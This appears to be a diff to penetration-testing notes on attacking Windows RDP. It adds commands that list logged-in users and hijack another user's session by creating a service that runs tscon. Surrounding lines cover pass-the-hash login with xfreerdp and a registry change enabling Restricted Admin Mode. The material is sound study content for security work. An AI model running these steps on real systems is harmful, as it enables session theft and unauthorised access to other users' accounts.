@@ -107,7 +107,10 @@ Attacking RDP
 			- xfreerdp
 	Hijacking other users:
 			1. If another user is connected via RDP to the compromised machine you can hijack their session
-					- Open Powershell (PS) 
+					- Open Powershell (PS) and type in query user to find listing of RDP users
+					- Command sc.exe create sessionhijack binpath= "cmd.exe /k tscon 4 /dest:rdp-tcp#13"
+					- net start sessionhijack
+					- This method no longer works on Server 2019
 			2. If somehow you acquire the hash of another user it can used in conjunction w/ xfreerdp to log in
 					- Restricted Admin Mode must be enabled on the target host
 					- Add a new reg key DisableRestrictedAdmin under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
